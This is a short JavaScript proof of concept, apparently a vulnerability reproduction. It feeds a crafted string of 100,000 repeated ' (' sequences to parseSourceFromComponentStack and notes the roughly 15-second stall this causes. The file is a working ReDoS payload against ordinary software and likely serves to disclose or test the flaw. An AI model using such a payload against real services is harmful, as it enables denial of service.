import { parseSourceFromComponentStack } from "./utils.js";

//Attack String :"at "+" ("*100000+":1"
var str = "at ";
for (var i = 0; i < 100000; i++) {
  str += " (";
}
str += ":1";

console.log(parseSourceFromComponentStack(str));

// real    0m14.727s
// user    0m14.687s
// sys     0m0.020s